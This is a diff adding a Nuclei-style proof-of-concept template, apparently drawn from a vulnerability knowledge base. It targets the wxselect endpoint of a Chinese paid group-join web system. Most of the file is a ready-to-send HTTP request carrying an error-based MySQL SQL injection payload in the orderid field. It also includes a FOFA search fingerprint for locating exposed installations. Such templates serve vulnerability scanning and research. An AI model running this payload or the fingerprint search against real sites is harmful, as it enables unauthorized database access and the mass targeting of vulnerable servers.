@@ -1,0 +1,33 @@
+id: poc-apraoc5nq4euoes1
+info:
+  name: 九块九付费进群系统 wxselect SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/apraoc5nq4euoes1'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: apraoc5nq4euoes1
+    fofa: body="/website/index/login.html"
+http:
+- raw:
+  - 'POST /group/index/wxselect HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Content-Type: application/x-www-form-urlencoded
+
+    orderid='') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x7e)),1,190))),5417)-- ylIU'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
